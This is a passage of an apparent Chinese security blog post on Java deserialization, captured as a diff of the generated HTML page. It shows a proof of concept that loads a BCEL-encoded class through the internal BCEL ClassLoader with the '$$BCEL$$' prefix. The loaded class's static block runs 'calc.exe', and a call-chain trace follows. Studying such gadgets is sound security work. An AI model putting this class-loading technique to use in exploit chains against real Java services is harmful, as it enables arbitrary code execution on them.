+    jr.close();
+
+    byte[] bytes = bos.toByteArray();
+
+    if(uncompress) &#123;
+      GZIPInputStream gis = new GZIPInputStream(new ByteArrayInputStream(bytes));
+
+      byte[] tmp   = new byte[bytes.length * 3]; // Rough estimate
+      int    count = 0;
+      int    b;
+
+      while((b = gis.read()) &gt;= 0)
+        tmp[count++] = (byte)b;
+
+      bytes = new byte[count];
+      System.arraycopy(tmp, 0, bytes, 0, count);
+    &#125;
+
+    return bytes;
+  &#125;
+</code></pre>
+<p>POC:</p>
+<pre><code class="java">import com.sun.org.apache.bcel.internal.Repository;
+import com.sun.org.apache.bcel.internal.classfile.JavaClass;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
+import com.sun.org.apache.bcel.internal.util.ClassLoader;
+
+
+public class BCEL &#123;
+    public static void main(String[] args) throws Exception &#123;
+        JavaClass cls = Repository.lookupClass(Calc.class);
+        String code = Utility.encode(cls.getBytes(), true);
+        System.out.println(code);
+
+        new ClassLoader().loadClass(&quot;$$BCEL$$&quot; + code).newInstance();
+    &#125;
+&#125;
+</code></pre>
+<p>Calc</p>
+<pre><code class="java">import java.io.IOException;
+
+public class Calc &#123;
+    static&#123;
+        try &#123;
+            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>调用链：</p>
+<pre><code>defineClass1:-1, ClassLoader (java.lang)
+decode:1240, Utility (com.sun.org.apache.bcel.internal.classfile)
+createClass:204, ClassLoader (com.sun.org.apache.bcel.internal.util)
+loadClass:152, ClassLoader (com.sun.org.apache.bcel.internal.util)
+loadClass:358, ClassLoader (java.lang)
+main:13, BCEL
+</code></pre>
+<p><img src="/2023/07/13/Java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963/CpZO/blog/source/_posts/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963.assets/image-20230720172102373.png" alt="image-20230720172102373"></p>
+</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2023/07/22/Java/%E5%86%85%E5%AD%98%E9%A9%AC/">prev</a><a class="next" href="/2023/07/12/Java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">next</a></div><div class="copyright"><p>&copy; 2023 <a href="http://example.com">Hurn</a>.<br>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/Dreyer/hexo-theme-artemis" target="_blank">Artemis</a>.</p></div></footer></div></body></html>
